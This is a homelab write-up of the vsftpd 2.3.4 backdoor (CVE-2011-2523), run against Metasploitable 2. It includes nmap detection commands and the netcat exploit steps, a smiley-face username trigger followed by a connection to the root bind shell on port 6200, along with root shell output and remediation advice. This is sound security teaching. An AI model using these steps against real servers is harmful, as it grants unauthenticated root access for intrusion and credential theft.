Overview

VSFTPD (Very Secure FTP Daemon) version 2.3.4 contained a deliberately introduced backdoor that was distributed via the official download mirror between June 30 and July 1, 2011. The backdoor was injected at the source level before distribution — a classic supply chain compromise.

When a user connects and sends a username ending with the string :) (a smiley face), the daemon spawns a bind shell on port 6200/tcp. Any subsequent connection to port 6200 receives a root shell without any further authentication. This gives an attacker complete unauthenticated remote code execution as root.

! Danger

Exploitation grants a root-level shell with no authentication required. This vulnerability has a CVSS base score of 10.0.

Environment Setup

This write-up was performed in an isolated homelab environment. No live or production systems were targeted.

  • Attacker: Kali Linux (192.168.56.10)
  • Target: Metasploitable 2 (192.168.56.11) — host-only adapter
  • Tools: Nmap, Netcat, Metasploit Framework (optional)

⚠ Warning

Only perform this in an isolated lab environment. Metasploitable 2 is intentionally vulnerable and must never be connected to the internet or an untrusted network.

Discovery / Enumeration

Start with a service version scan to identify the running FTP service and its version number:

kali — nmap 
$ nmap -sV -p 21 192.168.56.11

Starting Nmap 7.94 ( https://nmap.org )
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
Service Info: OS: Unix

Nmap immediately identifies vsftpd 2.3.4. Cross-referencing this version against known CVEs reveals CVE-2011-2523. The Nmap scripting engine can also detect the backdoor directly:

kali — nmap --script 
$ nmap --script ftp-vsftpd-backdoor -p 21 192.168.56.11

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-vsftpd-backdoor:
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2011-2523
|     Risk factor: High
|_    References: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523

Exploitation

The exploitation process is straightforward. The trigger is sending a username that contains :). The daemon then opens port 6200 on the target, which is a bind shell running as root.

// Info

The backdoor does not require a valid password. Only the username trigger matters. Any password (or blank) can be supplied.

Manual exploitation via Netcat:

kali — manual exploit 
# Step 1: Connect to FTP and send the backdoor trigger
$ nc 192.168.56.11 21
220 (vsFTPd 2.3.4)
USER backdoor:)
331 Please specify the password.
PASS anything
^C

# Step 2: Connect to the opened bind shell
$ nc 192.168.56.11 6200

Proof of Concept

After connecting to port 6200, the shell spawns as root with no prompt. Confirm with id and whoami:

kali — root shell 
$ nc 192.168.56.11 6200
id
uid=0(root) gid=0(root) groups=0(root)

whoami
root

hostname
metasploitable

uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

Root access confirmed. The shell is fully interactive and has unrestricted access to the target system.

Post-Exploitation

With root access established, the following post-exploitation activities were performed for documentation purposes in the isolated lab environment:

  • Retrieved /etc/shadow to demonstrate credential access
  • Enumerated listening services and active users
  • Confirmed persistence would be trivial given root-level access

Remediation

This vulnerability was resolved immediately after discovery. The recommended remediation steps are:

  1. Upgrade vsftpd — Replace 2.3.4 with a clean, verified version (2.3.5 or later). Verify checksums against trusted sources.
  2. Verify package integrity — Always validate GPG signatures or checksums of downloaded software before deployment.
  3. Network segmentation — Restrict FTP access to trusted hosts via firewall rules. Port 21 should not be exposed to untrusted networks.
  4. Disable FTP — If FTP is not strictly required, disable or replace it with SFTP (SSH file transfer).
  5. Monitor port 6200 — Any connection attempts to port 6200 from internal hosts should be treated as an indicator of compromise.

// Recommendation

Modern deployments should prefer SFTP over FTP. SFTP encrypts both authentication and data in transit, eliminating the cleartext credential exposure inherent to FTP.
